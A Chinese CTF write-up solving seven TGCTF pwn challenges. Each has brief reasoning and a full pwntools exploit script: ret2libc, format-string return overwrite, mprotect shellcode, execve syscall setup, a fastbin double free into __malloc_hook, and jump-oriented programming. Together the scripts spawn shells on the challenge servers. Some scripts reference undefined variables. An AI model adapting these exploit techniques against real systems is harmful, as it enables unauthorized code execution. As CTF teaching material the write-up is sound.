# TGCTF-pwn复现-先知社区

> **来源**: https://xz.aliyun.com/news/17753  
> **文章ID**: 17753

---

# TGctfWP-pwn

## 签到

gets函数造成的栈溢出，打ret2libc即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'
libc=ELF('./libc.so.6')
eir = 1
if eir == 1:
    p=remote('node1.tgctf.woooo.tech',32379)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

puts_plt=elf.plt['puts']

puts_got=elf.got['puts']
rdi=0x0000000000401176
pl1=b'a'*0x78+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401178)

sla("Welcome to the Hangzhou Normal University CTF competition, please leave your name.
",pl1)
libc_base=ll64()-libc.sym['puts']
system=libc_base+libc.sym['system']
binsh=libc_base+next(libc.search('/bin/sh'))
pl1=b'a'*0x78+p64(0x000000000040101a)+p64(rdi)+p64(binsh)+p64(system)+p64(0x401178)
#dbg()
sla("Welcome to the Hangzhou Normal University CTF competition, please leave your name.
",pl1)


ita()
```

## fmt

给了栈地址以及一次格式化字符串漏洞，修改printf的返回地址为0x40123d，即可反复利用格式化字符串漏洞，第一次格式化字符串漏洞顺便泄露libc基址，后续把返回地址改为one\_gagdet即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'
libc=ELF('./libc.so.6')
eir = 0
if eir == 1:
    p=remote("",)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()

def fmt(num,offset,size = 2):
    if size == 1:
        pay = b'%' + str(num).encode() + b'c%' + str(offset).encode() + b'$hhn'
    elif size == 2:
        pay = b'%' + str(num).encode() + b'c%' + str(offset).encode() + b'$hn'
    else:
        pay = b'%' + str(num).encode() + b'c%' + str(offset).encode() + b'$n'
    return pay

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

main = 0x04011B6
magic = 0x404010
ru("your gift ")
stack = rc(14)
pt(stack)
addr = stack + 0x68

ru("please tell me your name
")

pl = b"%" + str(0x3d).encode() + b"c%8$hhn%12$p"
pl = pl.ljust(0x10,b'a')
pl += flat(stack-8)
sd(pl)

ru("0x")
libc_base = ri(12) - 0x1f12e8
pt(libc_base)

onegadget = [0xe3afe,0xe3b01,0xe3b04][1] + libc_base
pt(onegadget)

gadget1 = onegadget & 0xffff
gadget2 = (onegadget>>16) & 0xffff
gadget3 = (onegadget>>32) & 0xffff

pl = b"%" + str(0x3d).encode() + b"c%9$hhn" + fmt(one-0x3d,10)
pl = pl.ljust(0x18) + flat(stack-8,addr)
pl = pl.ljust(0x30,b'a')

sd(pl)

pl = b"%" + str(0x3d).encode() + b"c%9$hhn" + fmt(two-0x3d,10)
pl = pl.ljust(0x18) + flat(stack-8,addr+2)
pl = pl.ljust(0x30,b'a')

sd(pl)

pl = b"%" + str(0x3d).encode() + b"c%9$hhn" + fmt(three-0x3d,10)
pl = pl.ljust(0x18) + flat(stack-8,addr+4)
pl = pl.ljust(0x30,b'a')

sd(pl)
sd(b'a'*0x30)

ita()
```

## overflow

看汇编得到，会跳转到ecx-4指向的地址，前面会把栈内容弹栈到rcx，可以完成一次栈迁移的操作

![](D:\pwn\pwn\pwn题\TGCTF\assets\image-20250413201844916.png)

静态编译，直接调用mprotect函数把bss段权限改为7，然后指向shellcode即可

```
from pwn import *
context(log_level='debug',os='linux',arch='i386')
fn='./pwn'
eir = 0
if eir == 1:
    p=remote('node2.tgctf.woooo.tech',30151)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

name=0x080EF320+4
bss=0x080EF000
sc=asm(shellcraft.sh())
main=0x08049807
mprotect=0x8070A70
pl=p32(mprotect)+p32(0x080EF334)+p32(bss)+p32(0x1000)+p32(7)+sc
dbg()
sa("could you tell me your name?
",pl)
pl1=b'a'*0xc8+p32(name)
#dbg()
sla("i heard you love gets,right?
",pl1)

ita()
```

## stack

看汇编得到

![](D:\pwn\pwn\pwn题\TGCTF\assets\image-20250413202304491.png)

会检测程序返回地址，不同则会跳转到0x4011b6

![](D:\pwn\pwn\pwn题\TGCTF\assets\image-20250413202138434.png)

0x4011b6存在通过0x4040a0对寄存器进行赋值，同时我们可以溢出来覆盖0x4040a0，所以直接执行execve("/bin/sh\x00",0,0)的系统调用即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'

eir = 1
if eir == 1:
    p=remote('node2.tgctf.woooo.tech',30243)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

binsh=0x404108
ret=0x000000000040101a

#dbg()
pl=b'a'*(0xa0-0x60)+p64(59)+p64(binsh)+p64(0)+p64(0)
sa("welcome! could you tell me your name?
",pl)
pl1=b'a'*0x50
sa("what dou you want to say?
",pl1)

ita()
```

## shellcode

写0x12字节以内的shellcode即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'

eir = 1
if eir == 1:
    p=remote('node2.tgctf.woooo.tech',30243)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

shell = asm('''
mov dl,7
mov al,10
mov sil, 0xff
syscall
mov rsi,rdi
xor edi,edi
mov dl,0xff
syscall
''')
shell2 = asm('''
mov rax,59
xor rdx,rdx
mov rdi,rsi
xor rsi,rsi
syscall
''')
#dbg()
sa('strength 
',shell)

sd(b'/bin/sh\x00'+b'\x90'*0x18+shell2)

ita()
```

## heap

2.23版本的菜单题，存在uaf，没show函数，但是edit可以输出，可以泄露libc，打fastbin泄露libc，然后再写malloc\_hook-0x23为onegadget即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
eir = 1
if eir == 1:
    p=remote("node1.tgctf.woooo.tech",32005)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def dbg():
    gdb.attach(p)
    pause()

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

def menu(choice):
    sla("> ",str(choice))

def add(size,content):
    menu(1)
    sla("size?
",str(size))
    sa("> ",content)

def dele(index):
    menu(2)
    sla("> ",str(index))

def edit(content):
    menu(3)
    ru("change your name?
")
    ru("> ")
    sd(content)

addr = 0x06020C0
pl1 = flat(0,0x21) + b'a' * 0x80 + flat(0,0x21,0,0,0,0x21)
sa("> ",pl1)


add(0x10,b'a')
add(0x10,b'a')
dele(0)
dele(1)
dele(0)
add(0x10,p64(addr))
add(0x10,b'a')
add(0x10,b'a')
add(0x10,b'a') # 5
edit(flat(0,0x91))
dele(5)
edit(b'a' * 0x10)
ru(b'a' * 0x10)
libc_base = ll64() - 0x3c4b78
pt(libc_base)
edit(flat(0,0x91))
onegadget = [0x4527a,0xf03a4,0xf1247][2] + libc_base
add(0x80,b'a') # 6
add(0x60,b'a') # 7
add(0x60,b'a') # 8
dele(7)
dele(8)
dele(7)

add(0x60,p64(libc_base+libc.sym["__malloc_hook"] - 0x23))
add(0x60,b'a')
add(0x60,b'a')
#dbg()
add(0x60,b'a' * 0x13 + p64(onegadget))
add(0x30,b'cat flag
')


ita()
```

## noret

![](D:\pwn\pwn\pwn题\TGCTF\assets\image-20250413203119831.png)

看汇编得到，和rop类似的jop打法（jmp oriented programming ）,只需要布置栈空间即可

```
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
fn='./pwn'
#libc=ELF('./libc.so.6')
eir = 1
if eir == 1:
    p=remote("node1.tgctf.woooo.tech",32255)
elif eir == 0:
    p=process(fn)
elf=ELF(fn)

def open_gdb_terminal():
    pid = p.pid
    gdb_cmd = f"gdb -ex 'attach {pid}' -ex 'set height 0' -ex 'set width 0'"
    subprocess.Popen(["gnome-terminal", "--geometry=120x64+0+0", "--", "bash", "-c", f"{gdb_cmd}; exec bash"])

def dbg():
    open_gdb_terminal()
    pause()


sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ita = lambda : p.interactive()
l64 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
ll64 = lambda : u64(p.recv(6).ljust(8,b'\x00'))
pt = lambda s : print("leak----->",hex(s))

syscall=0x4010e0

bss = elf.bss() + 0x800
magic = 0x0401010
rsi = 0x40101B
read = 0x0040115D
rsp = 0x040108F
rdi = 0x0401000
rdx = 0x401021
rax = 0x401024
xor_rax = 0x40100A
ret = 0x00401165

ru("> ")
sl('2')
ru("Submit your feedback: ")
pl = b'a' * 0x100 + flat(rsp,bss-8)
pl = pl.ljust(0x168,b'\0')
sd(pl)
ru("> ")
sl('2')
binsh = bss - 0x90 - 0x1d + 0x28
pl =p64(bss-0x80-1)+p64(bss-0x80)+p64(bss-0x78)+p64(rsi)
pl+=p64(rsi)+p64(binsh)+p64(rax)+p64(rdi)+p64(rdx)+p64(bss-0x78)+p64(xor_rax)+p64(59)
pl+=p64(rax)+p64(rdx)+p64(0)+p64(syscall)+p64(rsi)+p64(rdi)
pl+=p64(binsh)+p64(ret)+p64(rdx)+b'/bin/sh\x00'
pl =pl.ljust(0x100,b'\x00')
pl+=p64(rsp)+p64(bss-0x110)
pl = pl.ljust(0x168,b'\x00')
sd(pl)
ru("> ")
sl('2')
pl = b'a' * 0x100 + p64(magic)
sd(pl)


ita()
```
